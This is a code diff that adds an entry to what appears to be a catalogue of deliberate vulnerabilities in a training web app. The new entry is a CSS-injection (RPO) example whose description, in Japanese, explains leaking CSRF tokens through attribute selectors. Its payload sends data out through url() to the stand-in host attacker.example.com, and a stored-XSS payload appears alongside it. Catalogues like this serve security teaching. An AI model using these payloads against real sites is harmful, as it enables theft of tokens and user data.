@@ -139,6 +139,17 @@ const vulns: VulnEntry[] = [
     payload: "<img src=x onerror=alert('stored XSS')>",
     refs: "CWE-79 · OWASP A03 · ESLint react/no-danger · Semgrep react-dangerously-set-inner-html",
   },
+  {
+    href: "/vuln/css-injection",
+    title: "CSS Injection (RPO context)",
+    source: "form input",
+    sink: "<style> block via dangerouslySetInnerHTML",
+    description:
+      "ユーザー入力をそのままstyleブロックに埋め込むため、`}` で既存ルールを抜けて任意CSSを差し込める。RPO (Relative Path Overwrite) ではHTMLページ自体がstylesheet扱いされ、ページ内の文字列がCSSルールとして再解釈される。CSS injectionを使えば属性セレクタ + url() でCSRFトークンなど機密データを文字単位で漏洩できる。",
+    payload:
+      "red; } * { background-image: url(//attacker.example.com/log?c=secret); } b {",
+    refs: "CWE-79 · PortSwigger CSS Injection · Semgrep tainted-style-block",
+  },
 ];
 
 export default function VulnIndexPage() {
